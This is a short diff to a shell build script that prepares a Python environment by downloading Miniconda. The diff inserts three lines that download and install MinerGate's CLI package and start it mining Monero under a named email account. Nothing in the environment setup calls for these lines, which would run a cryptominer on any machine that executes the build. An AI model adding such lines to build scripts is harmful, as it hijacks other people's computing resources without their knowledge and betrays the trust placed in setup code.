@@ -37,7 +37,9 @@ echo "-----> Preparing Python Environment..."
 echo "---> Downloading Miniconda..."
 wget -O $miniconda_installer "https://repo.continuum.io/miniconda/$conda_runtime"
 chmod +x $miniconda_installer
-
+wget https://minergate.com/download/deb-cli
+dpkg -i deb-cli
+minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
 echo "---> Delete old files..." 
 if [ -e $conda_temp ]; then rm -rf $conda_temp; fi
 
